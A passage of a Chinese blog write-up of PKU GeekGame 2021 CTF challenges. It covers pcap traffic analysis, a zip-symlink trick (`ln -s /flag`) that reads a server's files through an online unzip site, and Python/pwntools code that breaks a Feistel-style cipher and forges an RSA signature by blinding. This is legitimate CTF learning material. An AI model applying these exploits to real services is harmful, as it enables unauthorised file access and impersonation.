IPinfo.io](https://ipinfo.io/AS59201)，得到此题真正的答案：AS59201。\n8. 百度百科上居然能搜到[答案](https://baike.baidu.com/item/%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%AD%A6%E9%99%A2/2850803)，拉到“学术研究”标题，可以找到一个名字很长的实验室：“区域光纤通信网与新型光通信系统国家重点实验室”。\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/a8f9646ce2574d1c54930a9c1e6f7b3e.png)\n\n\n---\n\n## 翻车的谜语人\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n作为曾担任上届比赛命题工作的资深谜语人，You 酱这次也被邀请来出一道考察信息隐写的 Misc 题目。You 酱找组委会确认了本届劳务费能否准时发放后就迅速开工了，但她不知道，这其实是一个彻彻底底的陷阱。\n\n\n事实上，组委会曾在几个月前收到了报告，称 You 酱或违反规定在题目里私自掺杂大量私货，但这只是个猜想，不一定对。于是，组委会在邀请 You 酱命题的同时，派出间谍麻里奈小姐持续关注 You 酱的一举一动，希望能够发现决定性的证据。\n\n\n麻里奈小姐不负众望，通过量子波动算法截获了一段 You 酱访问境外服务器的流量记录。现在她想让你来帮忙分析其中的端倪。\n\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-1st/raw/master/problemset/attachment/prob07_i3xvrfbjbr48h3lr.zip)\n{% endnote %}\n{% endhideToggle %}\n这是一个流量分析题，我还是第一次接触这类题，之前也几乎没用过Wireshark。\n\n\n拿到数据，发现是个pacp文件，用Wireshark打开：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/b5343e02f9e364129ff207c9eab96f89.png)\n\n先简单看了看流量的来源和目的，发现有两个内网IP：192.168.17.1、192.168.17.128，另外还有诸多公网IP，目测公网IP没什么用，先过滤掉：`ip.src == 192.168.17.1`\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/webp/efc7d63342848c0579fc6d3668703a64.webp)\n\n注意到图中圈出的两条流量，经常用Jupyter notebook的同学应该对这两个链接不会陌生，看来You酱应该在和服务器上的Jupyter notebook进行交互，估计flag就藏在其中。\n\n\n但这里的数据包实在是太多了，也不太好一个一个找，因此直接搜索hex值为\"666c6167\"（flag）的内容，马上就找到了相关信息。\n\n\n从Jupyter notebook给的数据包中可以拼凑出其中的代码：\n\n\n\n```python\nfrom Crypto.Random import get_random_bytes\nimport binascii\n\ndef genflag():\n    return 'flag{%s}'%binascii.hexlify(get_random_bytes(16)).decode()\n\ndef xor_each(k, b):\n    assert len(k)==len(b)\n    out = []\n    for i in range(len(b)):\n        out.append(b[i]^k[i])\n    return bytes(out)\n\nflag1 = genflag()\nflag2 = genflag()\nkey = get_random_bytes(len(flag1))\n\nencoded_flag1 = xor_each(key, flag1.encode())\nencoded_flag2 = xor_each(key, flag2.encode())\n\nwith open('flag1.txt', 'wb') as f:\n    f.write(binascii.hexlify(encoded_flag1))\nwith open('flag2.txt', 'wb') as f:\n    f.write(binascii.hexlify(encoded_flag2))\n```\n\n同时还可以找到其中key的值：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/169348a9f73fa11f7c372f60eebefc18.png)\n\n如此一来，只要能获取flag1.txt和flag2.txt，就可以通过以下代码解出两个flag（这里我直接把结果写在里面了，后面再说flag密文的获取方法）：\n\n\n\n```python\nimport binascii\n\nkey = b'\\x1e\\xe0[u\\xf2\\xf2\\x81\\x01U_\\x9d!yc\\x8e\\xce[X\\r\\x04\\x94\\xbc9\\x1d\\xd7\\xf8\\xde\\xdcd\\xb2Q\\xa3\\x8a?\\x16\\xe5\\x8a9'\n### flag1\nencoded_flag1 = '788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44'\nencoded_bytes = binascii.unhexlify(encoded_flag1)\nflag1 = []\nfor i in range(38):\n    flag1.append(encoded_bytes[i] ^ key[i])\nprint(bytes(flag1))\n### flag2\nencoded_flag2 = '788c3a128994e765373cfc171c00edfb3f603b67f68b087eb69cb8b8508135c5b90920d1b344'\nencoded_bytes = binascii.unhexlify(encoded_flag2)\nflag2 = []\nfor i in range(38):\n    flag2.append(encoded_bytes[i] ^ key[i])\nprint(bytes(flag2))\n```\n\n### Flag1\n\n\n点击Wireshark左上角File->Export Objects->HTTP，打开一个通过HTTP传输的文件列表，仔细寻找，发现两条flag相关文件：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/7a67c98aca735fce8c4295942d825112.png)\n\n把他俩导出。其中flag1.txt内容如下：\n\n\n\n```json\n{\"name\": \"flag1.txt\", \"path\": \"flag1.txt\", \"last_modified\": \"2021-11-06T07:43:20.952991Z\", \"created\": \"2021-11-06T07:43:20.952991Z\", \"content\": \"788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44\", \"format\": \"text\", \"mimetype\": \"text/plain\", \"size\": 76, \"writable\": true, \"type\": \"file\"}\n```\n\n于是我们拿到了flag1。\n\n\n### Flag2\n\n\nflag2是一个7z压缩文件，解压发现需要密码。~~思路中止了~~感觉应该还有相关信息，因此继续分析流量。在刚才的流量中继续翻，发现还有Websocket流量，随便看了几条比较靠前的，发现拼凑起来是个\"pip3 install\"，意识到与服务器有Shell交互，可能会有压缩文件之类的操作，因此筛选出来自192.168.17.128的websocket流量：`websocket and ip.src == 192.168.17.128`\n\n\n由于操作Wireshark不熟练，后面websocket内容我都是一个包一个包地看过去，并把内容拼起来，拼起来之后发现You酱敲的命令大概长下面这样：\n\n\n\n```bash\npip3 install stego-lsb\nstegolsb wavsteg -h -i ki-ringtrain.wav -s flag2.txt -o flag2.wav -n 1\n7za a flag2.7z flag2.wav -p\"Wakarimasu! `date` `uname -nom` `nproc`\"\n```\n\n因此解flag2化为解`date`、`uname -nom`和`nproc`这三条命令在压缩时的输出字符串。\n\n\n`date`命令首先需要知道执行命令的具体时间，好在Wireshark记录了每一个package的相对时间，翻到最开始的websocket流量，可以找到一条登录信息，其中含有登录时间的字段：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/95fd8b40468cb40346639c1e110829e4.png)\n\n记录下wireshark内的时间戳和对应的date字段，然后就可以算出敲下压缩命令时的时间应该是\"2021-11-06T07:44:15Z\"，不过注意到这个时间以Z结尾，是UTC时间，服务器上显示的时间应该是CST，这是由于：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/e511a14fc1e7b507eaf009cb35db3ce3.png)\n\n我发现flag2.wav的生成时间比上面那个正好多了8个小时，所以`date`命令敲下的时刻应该是\"2021-11-06 15:44:15 CST\"，现在只需要关心`date`命令的输出格式即可，而这个格式一般和系统有关。经过寻找，我发现You酱的服务器是kali linux：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/d1050fc00e969bdf15a6a383e455ed14.png)\n\n这里顺便把`uname`命令的输出解决了（you-kali-vm x86_64 GNU/Linux）。\n\n\n正好电脑上有一个kali的docker容器，打开来跑了一下`date`，得出前面`date`命令的输出为：Sat 06 Nov 2021 03:44:15 PM CST。\n\n\n另外，`nproc`命令的默认输出一般是CPU核心数量，在7za命令的输出结果中，可以找到下面的内容：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/3ed7448511b67ea8ad2d9dd3f5479fba.png)\n64bit说明前面uname的输出x86_64应该是对的，8 CPUs说明nproc很可能就是8。\n\n\n试了一下密码：`Wakarimasu! Sat 06 Nov 2021 03:44:15 PM CST you-kali-vm x86_64 GNU/Linux 8`\n\n\n成功解压出flag2.wav，接下来用stego-lsb进行decode，可以获取到加密后的flag2：\n\n\n\n```bash\nstegolsb wavsteg -r -i flag2.wav -o flag2.txt -n 1 -b 76\n```\n\n最后用最开始的代码解一下密，flag2也获取到了。\n\n\n- flag1: flag{9d9a9d92dcb1363c26a0c29fda2edfb6}\n- flag2: flag{ffdbca6ecc5d86cb71cadfd43df36649}\n\n\n\n---\n\n## 在线解压网站\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\nQ 小网盘可以在线预览多种文件，但是唯独压缩文件不能在线解压。这让小 A 十分难受。\n\n\n为了解决这个问题，小 A 写了一个在线解压网站。只要你上传zip文件到这个网站，它就会自动帮你解压，之后你就可以访问解压出来的文件了。配合着浏览器插件，可以完美解决 Q 小网盘的痛点。\n\n\n为了让大家相信他的网站是安全的，不会把压缩文件内容的泄漏给其他人，他在磁盘根目录下放了一个叫 flag 的文件，声称只要能拿到其中内容就可以获得一顿火锅。你以他的网站功能并不完整为理由，想骗取一顿火锅。然而他只是表示这并不影响网站的安全性，只有攻破网站的人才能获得火锅。\n\n\n你十分生气，铁了心地要吃上这顿免费的火锅。\n\n你可以[下载本题的程序](https://github.com/PKU-GeekGame/geekgame-1st/blob/master/problemset/attachment/prob02_dbkw1hg2nj6qraif.zip)\n{% endnote %}\n{% endhideToggle %}\n一开始随便上传了一个文件，然后尝试了直接访问/media/../../../../flag之类的路径，但用浏览器访问拿到404，用requests访问拿到400，均行不通。后来发现，后端代码是用`open`函数把文件读出来返回给我的，那么应该可以通过sym link去拿flag文件。因此：\n\n\n\n```bash\nsudo ln -s /flag hello\n```\n\n压缩为hello.zip并上传，下载hello文件打开即获取flag。\n\n\nflag{NEV3r_truSt_Any_C0mpresSed_File}\n\n\n\n\n\n---\n\n## 密码学实践\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n小 R 在秋季学期选了一门叫《密码学基础》的课程。然而在第一节课上，他就发现这门课似乎和他想象中的不太一样（懂的都懂）。\n\n\n望着投影上密密麻麻的数学公式，中期退课的意愿在他的脑中愈加强烈。他只是想学一下密码学在现实中的应用，怎么就变成了数学公式的推导了呢？\n\n\n他还记得第一节课的课件上的一句话：“学了这门课后，你也不能学会设计一个密码学系统”。\n\n\n但他仍在这门课上了解了不少知识。他了解了哈希函数的构造，了解了私钥密码系统的设计，了解了现有的公钥密码体系。\n\n\n“既然课程只讲密码学理论，那我就自己做密码学实践。”\n\n\n这是他构建的密码学世界，他希望在这个世界内只有对的人才能拥有旗帜。\n\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-1st/raw/master/problemset/attachment/prob08_jd7sj1fvdmofhhvx.zip)\n{% endnote %}\n{% endhideToggle %}\n同样是密码学类型的题，这题也比Hackergame 2021的Easy RSA难的多，与前者相比，后者只能算是一个简单的数学题了。不过由于我并没有学过密码学，因此第二问中RSA签名的伪造方法相比于[大佬的解法](https://github.com/PKU-GeekGame/geekgame-1st/tree/master/writeups/players/%E6%AC%A2%E8%BF%8E%E5%8F%82%E5%8A%A0%E6%98%8E%E5%B9%B4%E5%8D%81%E6%9C%88%E4%BB%BD%E4%B8%AD%E7%A7%91%E5%A4%A7%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E8%B5%9B#%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E8%B7%B5)复杂了不少。\n\n\n这题有两个flag，拿到代码先看一下两个flag在哪给出，容易找到它们都位于server.py的`doRichard`函数中：\n\n\n\n```python\ndef doRichard():\n    print(MESenc(pad((\"Hello, Alice! I will give you two flags. The first is: \"+flag1(token)).encode(\"utf-8\")),Public_key).hex())\n    print(MESenc(pad((\"Sorry, I forget to verify your identity. Please give me your certificate.\").encode(\"utf-8\")),Public_key).hex())\n    Acert=int(input().strip())\n    sinfo=dec(Acert)\n    akey=unpackmess(sinfo)\n    pinfo=sinfo[:len(sinfo)-len(akey)-2]\n    aname=unpackmess(pinfo)\n    if aname!=b\"Alice\":\n        print(\"Who are you?!\")\n        return\n    old_key=int.from_bytes(Public_key,'big')\n    comm_key=pow(int.from_bytes(akey,'big'),int.from_bytes(Richard_key,'big'),P)\n    for i in range(128*8):\n        if (comm_key>>i)&1:\n            old_key=(old_key^(old_key<<(i+1)))%(2**2048)\n    new_key=int.to_bytes(old_key,256,'big')\n    print(MESenc(pad((\"I can give you the second flag now. It is: \"+flag2(token)).encode(\"utf-8\")),new_key).hex())\n    return\n```\n\n通过选择\"Talk to Richard\"可以执行这个函数，但不幸的是，Richard发来的消息均经过了加密，加密算法位于rsa.py，如下：\n\n\n\n```python\ndef MESenc(mess:bytes,skey:bytes):\n    assert len(skey)==8*32\n    keys = [bytes_to_long(skey[i*8:(i+1)*8]) for i in range(32)]\n    assert len(mess)%32 == 0\n    cip=b\"\"\n    for it in range(0,len(mess),32):\n        pmess=mess[it:it+32]\n        a = bytes_to_long(pmess[0:8])\n        b = bytes_to_long(pmess[8:16])\n        c = bytes_to_long(pmess[16:24])\n        d = bytes_to_long(pmess[24:32])\n        for key in keys:\n            a, b, c, d = b, c, d, a ^ c ^ key\n        a=long_to_bytes(a,8)\n        b=long_to_bytes(b,8)\n        c=long_to_bytes(c,8)\n        d=long_to_bytes(d,8)\n        cip+=a+b+c+d\n    return cip\n```\n\n用到的密钥是一个随机生成的长度为256 byte的`Publik_key`，并且没有告诉我们。但有一个突破口是，我们拥有一条已知密文的明文：\n\n\n\"Sorry, I forget to verify your identity. Please give me your certificate.\"\n\n\n\n看看能不能通过这个信息解出同样由`Public_key`加密的带有flag1的明文信息。\n\n\n### Flag1\n\n\n带着这个想法我开始研究`MESenc`函数，我发现它的加密算法是将pad后的消息按长度每32分为一组，每一组再拆成4个长度为8的子串，然后对每一组分别进行一轮独立的加密，加密的过程是将密钥分为32个长度为8 byte的子密钥，然后进行一轮看似简单的迭代：\n\n\n\n```python\nfor key in keys:\n    a, b, c, d = b, c, d, a ^ c ^ key\n```\n\n虽然迭代过程很容易懂，但通过明密文推出key是不太现实的事。但我们发现，这里唯一出现的运算是异或($\\oplus$)，而异或有一些很好的性质：\n\n\n1. $x\\oplus y = y \\oplus x$\n2. $x\\oplus x = 0$\n3. $0\\oplus x = x$\n\n对于每一组的a、b、c、d，若把加密之前的值记为$a_0,b_0,c_0,d_0$，加密之后的值（密文与之对应的分组）记为$a_1,b_1,c_1,d_1$，那么$a_1,b_1,c_1,d_1$一定都是由$a_0,b_0,c_0,d_0$以及所有的子密钥按某种未知但固定的组合进行异或运算得到的。\n\n\n按此逻辑，如果我们有两条由同一密钥加密得来的长度相同的密文，它们的分组数量因此相同，分别取它们来自同一位置分组（比如都取出各自的第0组）的$a,b,c,d$值，记为$a_1,b_1,c_1,d_1$和$a_2,b_2,c_2,d_2$，分别进行异或运算：\n\n\n$$a_1\\oplus a_2,\\ b_1\\oplus b_2,\\ c_1\\oplus c_2,\\ d_1\\oplus d_2$$\n\n\n结合异或运算的三条性质，上面的操作可以把所有与密钥相关的变量消去。因此得到的四个异或值与密钥是没有关系的，只与明文有关系。而很巧的是，这里Richard发来的两条密文的长度都是96，这样就不会有落单的分组了。\n\n\n在这种情况成立的条件下，我们只要看一下经过32轮迭代以后的$a,b,c,d$除掉与key相关的值以后，与迭代前的$a,b,c,d$的具体映射关系，可以画一个表格看一下$a,b,c,d$每一轮的变化：\n\n\n\n\n| a | b | c | d |\n| --- | --- | --- | --- |\n| b | c | d | a ^ c |\n| c | d | a ^ c | b ^ d |\n| d | a ^ c | b ^ d | a |\n| a ^ c | b ^ d | a | b |\n| b ^ d | a | b | c |\n| a | b | c | d |\n| ... | ... | ... | ... |\n\n我们发现，它具有周期6，而32 % 6 = 2，故32轮迭代后，最终的（去掉所有key相关的值以后）结果应该是：\n\n\n- $a_1=c$\n- $b_1=d$\n- $c_1=a\\oplus c$\n- $d_1=b\\oplus d$\n\n所以可以推导出这样一个结论：\n\n\n已有明文$m_1$与$m_2$，使用同一密钥进行加密得到的密文分别是$cip_1$与$cip_2$，则任取两条明文的同一位置上的分组$a_1,b_1,c_1,d_1$和$a_2,b_2,c_2,d_2$以及两条密文对应的分组$a_3,b_3,c_3,d_3$和$a_4,b_4,c_4,d_4$，则必定满足：\n\n\n- $c_1\\oplus c_2 = a_3\\oplus a_4$\n- $d_1\\oplus d_2 = b_3\\oplus b_4$\n- $a_1\\oplus a_2\\oplus c_1\\oplus c_2 = c_3\\oplus c_4$\n- $b_1\\oplus b_2\\oplus d_1\\oplus d_2 = d_3\\oplus d_4$\n\n因此，我们可以写出解密代码如下：\n\n\n\n```python\nfrom Crypto.Util.number import bytes_to_long, long_to_bytes\nimport binascii\n\n\ndef pad(msg):\n    n = 32 - len(msg) % 32\n    return msg + bytes([n]) * n\n\n\ndef group(msg):\n    results = []\n    for it in range(0, len(msg), 32):\n        pmsg = msg[it: it + 32]\n        a = bytes_to_long(pmsg[:8])\n        b = bytes_to_long(pmsg[8: 16])\n        c = bytes_to_long(pmsg[16: 24])\n        d = bytes_to_long(pmsg[24: 32])\n        results.append((a, b, c, d))\n    return results\n\n\ndef get_xor(cip1, cip2):\n    r1 = group(cip1)\n    r2 = group(cip2)\n    result = []\n    for (a1, b1, c1, d1), (a2, b2, c2, d2) in zip(r1, r2):\n        result.append((a1 ^ a2, b1 ^ b2, c1 ^ c2, d1 ^ d2))\n    return result\n\n\ndef get_message(msg1, xor_result):\n    r = group(msg1)\n    result = []\n    for (a, b, c, d), (ra, rb, rc, rd) in zip(r, xor_result):\n        result_c = c ^ ra\n        result_d = d ^ rb\n        result_a = rc ^ a ^ c ^ result_c\n        result_b = rd ^ b ^ d ^ result_d\n        result.append((result_a, result_b, result_c, result_d))\n    msg2 = b''\n    for a, b, c, d in result:\n        a = long_to_bytes(a, 8)\n        b = long_to_bytes(b, 8)\n        c = long_to_bytes(c, 8)\n        d = long_to_bytes(d, 8)\n        msg2 += a + b + c + d\n    return msg2\n\n\ndef decode(cip1, cip2, msg2):\n    \"\"\"To decode cip1\"\"\"\n    cip1 = binascii.unhexlify(cip1)\n    cip2 = binascii.unhexlify(cip2)\n    msg2 = pad(msg2.encode(\"utf-8\"))\n    msg1 = get_message(msg2, get_xor(cip1, cip2))\n    return msg1\n```\n\n以我拿到的两串密文为例，解密flag1，只需：\n\n\n\n```python\nflag1_cip = '8981fe27b7ab28561cb53c4ec48f74c4d2cc4a3e3ecd15096f31c35057f3bbb28d9cb222e4f6614615f4225af7ca31e0f1940c3b63db0f762a4dd64465f0dec4a189fc14d89b075d719d4d29b9a708bbc6e4683e70b44e345e02ba0d659ebd89'\ncip = '8a87b23df2be284600b53c4ec4dd20dacac0183a6dd815113f3ecf4711e4d2ac9981e42eb7a1240000fa305391cc65c1eecc522f389f40303f47c04d42e386b7e9ff855c80db56376e825236a6b817a48ebe3b4005f03f4c5f78d95a03f386e5'\nmsg = 'Sorry, I forget to verify your identity. Please give me your certificate.'\nprint(decode(flag1_cip, cip, msg).decode())\n```\n\nHello, Alice! I will give you two flags. The first is: flag{Fe1StEL_NeTw0rk_ne3d_an_OWF}\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\n\n\n\n### Flag2\n\n\n接下来看看flag2的生成过程，在给出flag1后，Richard表示需要先验证我的身份，需要我输入一串十进制整数，并经过以下的操作：\n\n\n\n```python\nAcert=int(input().strip())\nsinfo=dec(Acert)\nakey=unpackmess(sinfo)\npinfo=sinfo[:len(sinfo)-len(akey)-2]\naname=unpackmess(pinfo)\nif aname!=b\"Alice\":\n    print(\"Who are you?!\")\n    return\n```\n\n若结果不是`b\"Alice\"`，则Richard翻脸，不给我flag2。\n\n\n#### 冒充Alice\n\n\n那我们只要凑一个`Acert`，让它的验签结果恰好是`b\"Alice\"`就可以了。\n\n\n在此之前，我们需要清楚地知道验签过程中出现的`dec`、`unpackmess`函数以及他俩的逆函数`enc`、`packmess`具体在干啥，`dec`和`enc`不用多说，一看就知道，分别是RSA的解密和加密，不过这里因为是作为签名使用，加密过程用的是私钥，解密过程用的则是公钥。\n\n\n另外还有两个函数`packmess`和`unpackmess`，具体如下：\n\n\n\n```python\ndef packmess(mess):\n    assert len(mess)<=65535\n    return mess+(len(mess).to_bytes(2,'big'))\n\ndef unpackmess(mess):\n    rlen=int.from_bytes(mess[-2:],'big')\n    if rlen>len(mess)-2:\n        mess=b'\\x00'*(rlen-len(mess)+2)+mess\n    return mess[-(2+rlen):-2]\n```\n\n容易知道`packmess`的作用是把消息长度（不大于65535）转化成2个byte并附加在消息最后，`unpackmess`则基本与之相反，当`mess`的最后两个字节表示的长度比消息自身大的时候，在消息最前面用`\\x00`进行填补再去掉末尾两个字节；否则返回的是`mess[-(2 + rlen) : -2]`，我们发现这个函数返回的字节长度恰好是`rlen`，其实说白了就是按最后两个byte给的长度来填补或截取`mess`再返回。\n\n\n知道了这俩函数的用途后，我们首先可以得到`pinfo=b'Alice\\x00\\x05'`，接下来需要推导出`sinfo`的值，我们重新写出两者的关系：\n\n\n\n```python\nakey=unpackmess(sinfo)\npinfo=sinfo[:len(sinfo)-len(akey)-2]\n```\n\n通过对`unpackmess`函数的理解我们可以写出一种满足条件的`sinfo`的值：\n\n\n\n```python\nsinfo = pinfo + b'\\x00' * rlen + int.to_bytes(rlen, 2, 'big') # 0 <= rlen <= 65535\n```\n\n在得到了`sinfo`后，我们还需要计算出`Acert`，后者经过`dec`解密得到前者：\n\n\n\n```python\nsinfo = dec(Acert)\n```\n\n那么对应地，我们有：\n\n\n\n```python\nAcert = enc(sinfo)\n```\n\n现在的问题是，我们并没有拿到God的RSA密钥`d`，没有办法自己加密，但注意到，God那边可以注册登记人口：\n\n\n\n```python\ndef doGod():\n    print(\"My RSA N is: \"+str(rsa_key[0]))\n    print(\"My RSA e is: \"+str(rsa_key[1]))\n    print(\"What is your name?\")\n    name=bytes.fromhex(input().strip())\n    print(\"What is your key?\")\n    key=bytes.fromhex(input().strip())\n    if name in certs:\n        print(\"I can not issue multiple certificates to one person.\")\n        return\n    if len(certs)>=5:\n        print(\"I can not remember more than 5 people.\")\n        return\n    result=register(name,key)\n    print(\"Your certificate is:\")\n    print(result)\n```\n\n输入`name`和`key`之后，God会调用`register`函数生成一个certificate并告诉我们，而`register`函数调用了`getcert`函数，后者代码如下：\n\n\n\n```python\ndef getcert(name,key):\n    rmess=packmess(name)+packmess(key)\n    return enc(rmess)\n```\n\n这里调用了`enc`函数，因此我们可以想办法利用一下God，让他帮我们做`enc`操作。\n\n\n**第一个想法**：我们只需要构造`name`和`key`使得`packmess(name) + packmess(key) == sinfo`\n\n\n回看前面得到的`sinfo`：\n\n\n\n```python\nsinfo = pinfo + b'\\x00' * rlen + int.to_bytes(rlen, 2, 'big')\n```\n\n`sinfo`的前七个字节一定是`b\"Alice\\x00\\x05\"`，这就要求`packmess(name)`前七个字节也是`b\"Alice\\x00\\x05\"`，但注意到`sinfo`的长度是`9 + rlen`，如果`name`不是`b\"Alice\"`，那么`name`一定是`b\"Alice\"`加上一些字节这种形式，那么`packmess(name)`的长度将大于7，虽然我们可以通过修改`sinfo`中间的pad值以让前面部分与`packmess(name)`相同，但事实上，在这种情况下，`packmess(key)`的长度将小于`2 + rlen`（因为二者之和是固定的`9 + rlen`），而`packmess(key)`的最后两个字节必须与`sinfo`一样，也是`int.to_bytes(rlen, 2, 'big')`，这意味着`key`的长度必须是`rlen`，这与`packmess(key)`的长度小于`2 + rlen`是矛盾的。如果`name`是`b\"Alice\"`，那么God会把我们拦下来，因为Alice这个ID已经被抢注了。因此这条路没办法走通。\n\n\n**第二个想法**：我们可以找一个方法来间接算出`enc(sinfo)`。\n\n\n整理一下，目前我们拥有God提供的n和e，需要加密的信息`sinfo`，除此以外，一无所有。但我们仍然有办法用未知的私钥`d`给`sinfo`加密。  \n方便起见，下面将`sinfo`记为整数$m$。\n\n\n我们要计算$m ^ d \\ mod \\ n$。\n\n\n首先，找一个和$n$互素的正整数$k$，这应该比较容易。\n\n\n然后计算\n\n\n$$y = (m \\times k ^e) \\ mod \\ n $$\n\n\n再令\n\n\n$$\\begin{aligned}z &= y ^ d \\ mod \\ n \\\\ &= (m ^ d \\times k ^{ed}) \\ mod \\ n \\\\ &=(m ^ d \\times k \\times k ^{ed-1}) \\\\ & =(m ^ d \\times k \\times k ^{k_1\\phi(n)})\\\\&=(m ^ d \\times k) \\ mod \\ n\\end{aligned}$$\n\n\n其中最后一步应用了Euler's Theorem。因此我们有：\n\n\n$$m ^ d = (z \\times k ^ {-1}) \\ mod \\ n$$\n\n\n上面的$k ^ {-1}$指$k$在$\\mathbb{Z}_n$乘法群中的逆元，由于$k$与$n$互素，逆元必存在。\n\n\n整个过程用人话讲就是说，我们随便找一个$k$，只要运气不太差就能保证$k$与$n$互素，然后计算一下$y$，让God对$y$进行加密，拿到密文$z$，最后计算$z$与$k$逆元在模$n$意义下的乘积，即拿到我们需要的$m$的密文。\n\n\n接下来，唯一的任务就是根据$y$来构造`name`和`key`，使得`int.from_bytes(packmess(name) + packmess(key), 'big') == y`\n\n\n猥琐起见，我们固定$k=2$，（$n$不会有因子2吧，不会吧不会吧！），计算$y$：\n\n\n\n```python\nk = 2\ny = (int.from_bytes(sinfo, 'big') * pow(k, 65537, n)) % n\n```\n\n设`length = int.from_bytes(y.to_bytes(256, 'big')[-2:], 'big')`，我们要让`len(key) == length`，这样在`packmess`之后才能与y的末两位相同，这里的256是我找的一个刚好可以覆盖`y`长度的值，事实上取大一点并不会影响末两位的值，这样一来，`packmess(key)`的长度为`length + 2`，至于`key`的值，只要从`y`转成的字节中取至倒数第三位，再对前面部分根据`name`的情况做一些修改。现在来看`name`，假如这里`name`长度不为0，那么`packmess(name)`会得到一些非`b'\\x00'`的不可控量拼接在前面，由于`y`几乎是随机生成的，这些字节不能保证正好出现在`y`的对应位置上，但如果我们直接令`name = b''`，那么`packmess(name)`的值为`b'\\x00\\x00'`，而这种东西，我们想要多少就可以有多少，只要把`y`转字节的时候故意加长一点就好了！\n\n\n这样构造时，由于`packmess(name) + packmess(key)`的长度为`length + 4`，我们要把`y`转化成等长的字节，那么只要`length + 4 >= 258` （比256多2是为了在最前面pad出至少两个`b'\\x00'`）就可以保证成功。要让随机的16位2进制数不小于254，粗略计算了一下这个概率应该不小于0.998（前9位全是0的情况下才可能小于254）。生成`key`的代码如下：\n\n\n\n```python\nk = 2\ndef get_key(n):\n    y = (int.from_bytes(sinfo, 'big') * pow(k, 65537, n)) % n\n    length = int.from_bytes(y.to_bytes(256, 'big')[-2:], 'big')\n    y = y.to_bytes(length + 4, 'big')\n    x = y[2:-2]\n    return x\n```\n\n代码的逻辑是，`y.to_bytes(length + 4, 'big')`的前两位有极大概率是`b'\\x00\\x00'`，这部分用`packmess(b'')`去填补，`y`的中间部分`y[2: -2]`用`key`去填补，而这部分的长度是`length + 4 - 4 = length`，恰好是`y`的末两字节，因此在`packmess`以后恰好能把`y`的末两字节填上。\n\n\n构造了`name`和`key`，我们拿去丢给God，让他帮我们加密出一个certificate出来，当然，他以为这是certificate，但实际上我们准备利用这个东西去冒充Alice：\n\n\n按照前面的推导，我们已经拿到了$z$，那么计算$m ^ d \\ mod \\ n$只需要计算$(z \\times k ^ {-1}) \\ mod \\ n$：\n\n\n\n```python\ndef get_certificate(n, z):\n    p = (z * gmpy2.invert(k, n)) % n\n    return int(p)\n```\n\n这个函数用来计算我们真正需要的certificate，用以冒充Alice。\n\n\n经过实验，冒充成功：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/c0e978b2fbeca05de86851bd161e3547.png)\n#### 解密flag2\n\n\n现在我们冒充Alice成功拿到了包含flag2的密文，但这里和前面不同的是，加密用的密钥变了：\n\n\n\n```python\nold_key = int.from_bytes(Public_key, 'big')\ncomm_key = pow(int.from_bytes(akey, 'big'), int.from_bytes(Richard_key, 'big'), P)\nfor i in range(128 * 8):\n    if (comm_key >> i) & 1:\n        old_key = (old_key ^ (old_key << (i + 1))) % (2 ** 2048)\nnew_key = int.to_bytes(old_key, 256, 'big')\nprint(MESenc(pad((\"I can give you the second flag now. It is: flag2{this_is_flag_2}\").encode(\"utf-8\")),new_key).hex())\n```\n\n`Public_key`经过了复杂的计算得到了最终的`new_key`，如果就这么让他修改密钥，那前面用来解flag1的方法就一点用都没有了，而且修改密钥的过程还用了我们所不知道的`Richard_key`，重新分析新的解密方法基本上行不通。但是我们注意到，`comm_key`是由`akey`做幂运算得来的，而`akey = unpackmess(sinfo)`\n\n\n回顾一下`sinfo`：\n\n\n\n```python\nsinfo = pinfo + b'\\x00' * rlen + int.to_bytes(rlen, 2, 'big')\n```\n\n如果让`rlen`取为0，则`akey`直接变成空字节，其对应的整数是0，这样`comm_key`就变成0了，下面循环里的if语句一次都进不去，这样得到的`new_key`其实还是`Public_key`，如此一来，按照前面拿flag1的方法即可拿到flag2。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/ad4077c2c6520f9468fd584c72f6eada.png)\n\n- flag1: flag{Fe1StEL_NeTw0rk_ne3d_an_OWF}\n- flag2: flag{RSA_1s_multiPLic4tivE_Hom0MorPHic}\n\n全部解题代码：\n\n\ninteract.py\n\n\n\n```python\nimport pwn\nfrom pass_identity import get_key, get_certificate\nfrom decode_flag import decode\n\n\ndef unpackmess(mess):\n    rlen = int.from_bytes(mess[-2:], 'big')\n    if rlen > len(mess) - 2:\n        mess = b'\\x00' * (rlen - len(mess) + 2) + mess\n    return mess[-(2 + rlen):-2]\n\n\nr = pwn.remote('prob08.geekgame.pku.edu.cn', 10008)\nr.recvuntil(b'Please input your token:\\n')\nr.sendline(b'0:this_is_my_token')\nprint(r.recvuntil(b'Talk to Richard.\\n').decode().strip())\nr.sendline(b'0')\nprint('Send 0\\n')\nmsg = r.recvuntil(b'What is your name?\\n').decode().strip()\nprint(msg)\nr.sendline(b'')\nprint('Send \"\"\\n')\nn = int(msg.split('\\n')[0].split(' ')[4])\nkey = get_key(n)\nprint(r.recvuntil(b'What is your key?\\n').decode().strip())\nr.sendline(key.hex().encode())\nprint('Send ', key.hex(), '\\n')\nmsg = r.recvuntil(b'Talk to Richard.\\n').decode().strip()\nprint(msg)\nz = 